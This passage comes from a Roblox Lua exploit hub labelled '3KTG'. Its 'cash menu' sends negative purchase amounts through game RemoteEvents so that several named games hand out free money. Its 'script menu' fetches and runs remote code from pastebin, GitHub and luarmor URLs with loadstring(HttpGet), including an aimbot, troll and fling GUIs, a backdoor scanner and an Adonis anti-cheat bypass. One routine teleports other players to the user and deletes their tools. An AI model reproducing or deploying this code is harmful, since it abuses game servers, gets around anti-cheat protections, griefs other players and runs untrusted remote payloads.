FOVLabel.Text = "FOV: " .. Environment.FOVSettings.Amount
FOVLabel.Parent = Frame

-- Toggle button for Show/Hide
ToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "FOV: Visible"
ToggleButton.Parent = Frame

-- FOV slider logic
local dragging = false

local function updateFOV(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newFOV = math.floor(50 + percent * 400)
    Environment.FOVSettings.Amount = newFOV
    FOVLabel.Text = "FOV: " .. newFOV
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local percent = (UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateFOV(percent)
    end
end)

-- Toggle FOV visibility
ToggleButton.MouseButton1Click:Connect(function()
    Environment.FOVSettings.Visible = not Environment.FOVSettings.Visible
    if Environment.FOVSettings.Visible then
        ToggleButton.Text = "FOV: Visible"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    else
        ToggleButton.Text = "FOV: Hidden"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    end
end)

-- Initial setup
updateFOV((Environment.FOVSettings.Amount - 50) / 400)
end)

--// Function to Add Buttons to Main Menu
local function addMainMenuButton(text, callback)
	local panel = tabPanels["CASH MENU"]
	if not panel then return end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 36)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamSemibold
	button.TextSize = 14
	button.Text = text
	button.AutoButtonColor = false
	button.Parent = panel
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)

	button.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

addMainMenuButton("KALYE ONSE [3KTG]", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA CASH MENU"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").AntiExploit:FireServer("Glock-17", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("TONDO ROLEPLAY [3KTG]", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA CASH MENU"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").BuyEvent:FireServer("Silenced Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("THE BILLIONARE CITY [3KTG]", function()
    local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.5, -110, 0.5, -60)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "MONEY"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Money Label
local moneyLabel = Instance.new("TextLabel")
moneyLabel.Size = UDim2.new(1, -20, 0, 25)
moneyLabel.Position = UDim2.new(0, 10, 0, 38)
moneyLabel.BackgroundTransparency = 1
moneyLabel.Text = "$0"
moneyLabel.TextColor3 = Color3.new(0, 1, 0)
moneyLabel.Font = Enum.Font.Gotham
moneyLabel.TextSize = 20
moneyLabel.TextXAlignment = Enum.TextXAlignment.Left
moneyLabel.Parent = frame

-- Cash Button
local cashButton = Instance.new("TextButton")
cashButton.Size = UDim2.new(0, 80, 0, 30)
cashButton.Position = UDim2.new(1, -90, 1, -38)
cashButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
cashButton.Text = "CASH"
cashButton.TextColor3 = Color3.new(1, 1, 1)
cashButton.Font = Enum.Font.GothamBold
cashButton.TextSize = 14
cashButton.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = cashButton

-- Toggle Switch
local toggleFrame = Instance.new("Frame")
toggleFrame.Size = UDim2.new(0, 40, 0, 20)
toggleFrame.Position = UDim2.new(0, 10, 1, -30)
toggleFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
toggleFrame.Parent = frame

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 10)
toggleCorner.Parent = toggleFrame

local toggleButton = Instance.new("Frame")
toggleButton.Size = UDim2.new(0, 16, 0, 16)
toggleButton.Position = UDim2.new(0, 2, 0.5, -8)
toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
toggleButton.Parent = toggleFrame

local toggleBtnCorner = Instance.new("UICorner")
toggleBtnCorner.CornerRadius = UDim.new(0, 8)
toggleBtnCorner.Parent = toggleButton

-- Draggable Functionality
local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end
end)

-- Toggle State
local isOn = false
local connection

toggleFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isOn = not isOn
		if isOn then
			toggleButton.Position = UDim2.new(1, -18, 0.5, -8)
			toggleButton.BackgroundColor3 = Color3.new(0, 1, 0)
			toggleFrame.BackgroundColor3 = Color3.new(0.1, 0.4, 0.1)
			
			-- Auto-fire every 0.1 seconds
			connection = RunService.Heartbeat:Connect(function()
				if ReplicatedStorage:FindFirstChild("GiveAyuda") then
					ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
				end
			end)
			-- Delay first fire slightly to avoid rate limit
			task.wait(0.1)
		else
			toggleButton.Position = UDim2.new(0, 2, 0.5, -8)
			toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
			toggleFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
			
			if connection then
				connection:Disconnect()
				connection = nil
			end
		end
	end
end)

-- Manual CASH button (optional, still works)
cashButton.MouseButton1Click:Connect(function()
	if ReplicatedStorage:FindFirstChild("GiveAyuda") then
		ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
	end
end)

-- Update money display
spawn(function()
	if player:FindFirstChild("leaderstats") then
		local cash = player.leaderstats:FindFirstChild("Cash") or player.leaderstats:FindFirstChild("Money")
		if cash then
			cash.Changed:Connect(function()
				moneyLabel.Text = "$"..tostring(cash.Value)
			end)
			moneyLabel.Text = "$"..tostring(cash.Value)
		end
	end
end)
end)

addMainMenuButton("PROMINENCE CITY S1 [3KTG]", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA CASH MENU"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").BuyToolEvent:FireServer("Calisto Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("CAVITE ROLEPLAY [3KTG]", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA CASH MENU"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Silenced Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("URBAN CITY V3 [3KTG]", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA CASH MENU"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").GunStoreFolder.BuyTool:FireServer("Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

--// Function to Add Buttons to Main Menu
local function addMainMenuButton(text, callback)
	local panel = tabPanels["SCRIPT MENU"]
	if not panel then return end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 36)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamSemibold
	button.TextSize = 14
	button.Text = text
	button.AutoButtonColor = false
	button.Parent = panel
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)

	button.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("BACKDOOR SCANNER [3KTG]", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/inks0adx",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BRING PART [3KTG]", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/qEw15UV3",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CLIENT SPAWNER] [3KTG]", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/8f5yA0An",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("ADMIN TROLL [3KTG]", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/VjzUsTdB",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("UNCH PARTS [3KTG]", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/VjzUsTdB",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("FLING SELECT [3KTG]", function()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-fe-fling-gui-8018"))() 
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("JERK [3KTG]", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/FWwdST5Y"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CHAT TROLL [3KTG]", function()
	loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/BetterBypasser/loader.lua"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("SHY GUY [3KTG]", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/SpiderScriptRBUniversal/refs/heads/main/Protected_Spider.txt"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("AIMBOT V2 [3KTG]", function()
	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("V1 TROLL [3KTG]", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("V2 TROLL [3KTG]", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("ADONIS BYPASS CP [3KTG]", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CLIENT BRING  [3KTG]", function()
	local L1 = true;
local L2 = game.Players.LocalPlayer.Character.HumanoidRootPart;
local L3 = L2.Position - Vector3.new(5, 0, 0)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(L_4_arg1)
    if L_4_arg1 == 'f' then
        L1 = not L1
    end;
    if L_4_arg1 == 'r' then
        L2 = game.Players.LocalPlayer.Character.HumanoidRootPart;
        L3 = L2.Position - Vector3.new(5, 0, 0)
    end
end)

for L_5_forvar1, L_6_forvar2 in pairs(game.Players:GetPlayers()) do
    if L_6_forvar2 == game.Players.LocalPlayer then
    else
        local L7 = coroutine.create(function()
            game:GetService('RunService').RenderStepped:Connect(function()
                local L8, L9 = pcall(function()
                    local L10 = L_6_forvar2.Character;
                    if L10 then
                        if L10:FindFirstChild("HumanoidRootPart") then
                            if L1 then
                                L_6_forvar2.Backpack:ClearAllChildren()
                                for L_11_forvar1, L_12_forvar2 in pairs(L10:GetChildren()) do
                                    if L_12_forvar2:IsA("Tool") then
                                        L_12_forvar2:Destroy()
                                    end
                                end;
                                L10.HumanoidRootPart.CFrame = CFrame.new(L3)
                            end
                        end
                    end
                end)
                if L8 then
                else
                    warn("Unnormal error: "..L9)
                end
            end)
        end)
        coroutine.resume(L7)
    end
end;
-- check for updates
game.Players.PlayerAdded:Connect(function(L_13_arg1)
    if L_13_arg1 == game.Players.LocalPlayer then
    else
        local L14 = coroutine.create(function()
            game:GetService('RunService').RenderStepped:Connect(function()
                local L15, L16 = pcall(function()
                    local L17 = L_13_arg1.Character;
                    if L17 then
                        if L17:FindFirstChild("HumanoidRootPart") then
                            if L1 then
                                L_13_arg1.Backpack:ClearAllChildren()
                                for L_18_forvar1, L_19_forvar2 in pairs(L17:GetChildren()) do
                                    if L_19_forvar2:IsA("Tool") then
                                        L_19_forvar2:Destroy()
                                    end
                                end;
                                L17.HumanoidRootPart.CFrame = CFrame.new(L3)
                            end
                        end
                    end
                end)
                if L15 then
                else
                    warn("Unnormal error: "..L16)
                end
            end)
        end)
        coroutine.resume(L14)
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PRESS Q TO FREECAM [3KTG]", function()
	-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

-- Settings
local MOVE_SPEED = 150
local SPRINT_MULTIPLIER = 2
local MOUSE_SENSITIVITY = 0.15
local MAX_PITCH = 89

-- State
local enabled = false
local yaw = 0
local pitch = 0
local moveDir = Vector3.new()
local sprint = false
local originalCameraType
local originalMouseBehavior
local originalMouseIconEnabled
local humanoid
local savedWalkSpeed
local savedJumpPower
local justToggled = false -- NEW: para pigilan extra input sa frame ng toggle

-- Helpers for movement direction
local function addKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end  -- forward
	if key == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end -- backward
	if key == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir += Vector3.new(0,-1,0) end
end

local function removeKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir -= Vector3.new(0,-1,0) end
end

-- Toggle freecam
local function toggleFreecam()
	enabled = not enabled
	moveDir = Vector3.new() -- NEW: reset movement dir agad
	sprint = false
	justToggled = true

	if enabled then
		-- Save original states
		originalCameraType = cam.CameraType
		originalMouseBehavior = UserInputService.MouseBehavior
		originalMouseIconEnabled = UserInputService.MouseIconEnabled

		-- Freeze character
		if player.Character then
			humanoid = player.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				savedWalkSpeed = humanoid.WalkSpeed
				savedJumpPower = humanoid.JumpPower
				humanoid.WalkSpeed = 0
				humanoid.JumpPower = 0
			end
		end

		-- Set yaw/pitch
		local x, y, z = cam.CFrame:ToEulerAnglesYXZ()
		pitch = math.deg(x)
		yaw = math.deg(y)

		cam.CameraType = Enum.CameraType.Scriptable
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
	else
		-- Restore character movement
		if humanoid then
			humanoid.WalkSpeed = savedWalkSpeed or 16
			humanoid.JumpPower = savedJumpPower or 50
		end
		cam.CameraType = originalCameraType or Enum.CameraType.Custom
		UserInputService.MouseBehavior = originalMouseBehavior or Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = originalMouseIconEnabled
	end
end

-- Keybinds
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.Q then
		toggleFreecam()
		return
	end

	if justToggled then return end -- NEW: block key presses sa toggle frame

	if enabled and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.LeftShift then
			sprint = true
		else
			addKeyDirection(input.KeyCode)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe or not enabled then return end
	if justToggled then return end -- NEW: block releases sa toggle frame

	if input.KeyCode == Enum.KeyCode.LeftShift then
		sprint = false
	else
		removeKeyDirection(input.KeyCode)
	end
end)

-- Mouse look
UserInputService.InputChanged:Connect(function(input, gpe)
	if not enabled then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		yaw -= input.Delta.X * MOUSE_SENSITIVITY
		pitch = math.clamp(pitch - input.Delta.Y * MOUSE_SENSITIVITY, -MAX_PITCH, MAX_PITCH)
	end
end)

-- Camera movement
RunService.RenderStepped:Connect(function(dt)
	if justToggled then
		justToggled = false -- reset block flag after 1 frame
	end
	if not enabled then return end

